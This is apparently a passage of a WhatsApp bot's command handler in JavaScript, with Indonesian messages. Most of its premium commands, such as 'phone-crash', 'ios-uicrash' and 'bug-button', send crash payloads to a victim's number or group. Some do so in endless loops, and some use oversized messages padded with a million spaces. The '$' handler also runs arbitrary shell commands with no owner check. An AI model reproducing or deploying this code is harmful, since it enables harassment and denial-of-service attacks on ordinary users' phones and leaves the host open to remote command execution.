let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'bug-quoted': {
if (!isPremium) return reply(`khusus premium bro !`)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break

case "bug-engine": {
if (!isPremium) return reply(`khusus premium bro !`)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285809388803") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "engine-ui": {
if (!isPremium) return reply(`khusus premium bro !`)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285809388803") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "engine-external": {
if (!isPremium) return reply(`khusus premium bro !`)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285809388803") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "engine-internal": {
if (!isPremium) return reply(`khusus premium bro !`)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285809388803") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "engine-crash": {
if (!isPremium) return reply(`khusus premium bro !`)
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6285809388803") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case 'internal-quoted': {
if (!isPremium) return reply(`khusus premium bro !`)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'external-quoted': {
if (!isPremium) return reply(`khusus premium bro !`)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'stardust': {
if (!isPremium) return reply(`khusus premium bro !`)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 40; j++) {
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'diam': {
if (!isOwner) return reply(mess.only.owner)
anggazyy.public = false
reply('succes')
}
break
case 'public': {
if (!isOwner) return reply(mess.only.owner)
anggazyy.public = true
reply('succes')
}
break
//=================================================//
case '🌷': case '💥': {
if (!isPremium) return reply(`khusus premium bro !`)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case '⭐': case '⚡': {
if (!isPremium) return reply(`khusus premium bro !`)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 10; j++) {
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'onekil': case 'doublekil': case '💀': case 'triplekill': {
if (!isPremium) return reply(`khusus premium bro !`)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 1; j++) {
await baklis(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'unlimited-bug': case '😈': {
if (!isPremium) return reply(`khusus premium bro !`)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (;;) {
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await sleep(30000)
}
}
break
case 'realyreact': {
if (!isPremium) return reply(`khusus premium bro !`)

if (!m.quoted) return reply(`Example usage: ${prefix + command} reply chat`)

await anggazyy.sendMessage(m.chat, { text: 'Success In Sending Bug', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: `By rlzcmods`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })

await sleep(2000)

await anggazyy.sendMessage(m.chat, { react: { text: '🐛', key: { remoteJid: m.chat, fromMe: true, id: quoted.id } } })

}

break        
        case 'devil-list': {

if (!isPremium) return reply(`khusus premium bro !`)

if (!text) return reply(`Example:\n${prefix + command} 62xxxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await anggazyy.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}

reply(`Successfully Sent Bug To ${victim}`)

}
//=================================================//
case 'phone-crash': {
if (!isPremium) return reply(`khusus premium bro !`)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
  for (;;) {
    await ngeloc(target, ryobug)
  }
}
break
//=================================================//
case 'ios-unlimited': case 'ios-ui': {
if (!isPremium) return reply(`khusus premium bro !`)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
await reply(`In proses....`)
let target = bijipler + '@s.whatsapp.net'
  for (;;) {
    await aipong(target)
    await sleep(1200)
  }
}
break
//=================================================//
case 'ios-uicrash': case 'ios-infinity': {
if (!isPremium) return reply(`khusus premium bro !`)
if (!q) return reply(`Penggunaan .${command} 6287392784527|1\n# memasukkan 1 sama dengan 300.detik`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527|1`)
let target = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1] * 200
let ppk = jumlah * 1.5
m.reply(ppk + " detik");
reply(`In proses....`)
for (let j = 0; j < jumlah; j++) {
await aipong(target)
await sleep(1500)
}
reply(`👤 Succes Send Bug Ke ${target} dalam kurun waktu ${ppk} detik`)
}
break
//=================================================//
case 'bug-button': case 'buggcry': {
if (!isPremium) return reply(`khusus premium bro !`)
if (!q) return reply(`Penggunaan .${command} https://chat.whatsapp.com/`)
reply(`In proses....`)
let result = args[0].split('https://chat.whatsapp.com/')[1];
let target = await anggazyy.groupAcceptInvite(result);
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰𝙰𝚗𝚐𝚐𝚊𝚣𝚢𝚢 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #anggazyy666"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻DevilS⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: ryobug })
await anggazyy.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
reply(`<✓> Successfully Send Bug to ${target} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'button-internal': case 'button-external': {
if (!isPremium) return reply(`khusus premium bro !`)
if (!q) return reply(`Penggunaan .${command} https://chat.whatsapp.com/`)
reply(`In proses....`)
let result = args[0].split('https://chat.whatsapp.com/')[1];
let target = await anggazyy.groupAcceptInvite(result);
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰𝙰𝚗𝚐𝚐𝚊𝚣𝚢𝚢 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #anggazyy666"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻DevilS⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: ryobug })
await anggazyy.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
reply(`<✓> Successfully Send Bug to ${target} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'enemygroup': case 'bug-hole': {
if (!isPremium) return reply(`khusus premium bro !`)
if (!q) return reply(`Penggunaan .${command} 1962623836281@g.us`)
reply(`In proses....`)
target = q
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰𝙰𝚗𝚐𝚐𝚊𝚣𝚢𝚢 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #anggazyy666"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻DevilS⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: ryobug })
await anggazyy.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
reply(`<✓> Successfully Send Bug to ${target} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'internal-group': case 'external-group': {
if (!isPremium) return reply(`khusus premium bro !`)
if (!q) return reply(`Penggunaan .${command} 1962623836281@g.us`)
reply(`In proses....`)
target = q
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰𝙰𝚗𝚐𝚐𝚊𝚣𝚢𝚢 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #anggazyy666"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻DevilS⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: ryobug })
await anggazyy.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
reply(`<✓> Successfully Send Bug to ${target} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'tiktok':
case 'tiktokvideo': {
if (!text) return reply( `Contoh : ${prefix + command} link`)
if (!q.includes('tiktok')) return m.reply(`Link Invalid!!`)
await reply('sebentar')
require('./lib/tiktok').Tiktok(q).then( data => {
anggazyy.sendMessage(m.chat, { video: { url: data.nowm }}, { quoted: m })
})
}
break
case "delprem":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285702447728`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
reply(`Nomor ${ya} Telah Di Hapus Premium!`)
}
break
default:
}
if (budy.startsWith('$')) {
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)
})
}
if (budy.startsWith(">")) {
if (!isOwner) return reply(mess.only.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}
} catch (e) {
console.log(e)
anggazyy.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}
}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})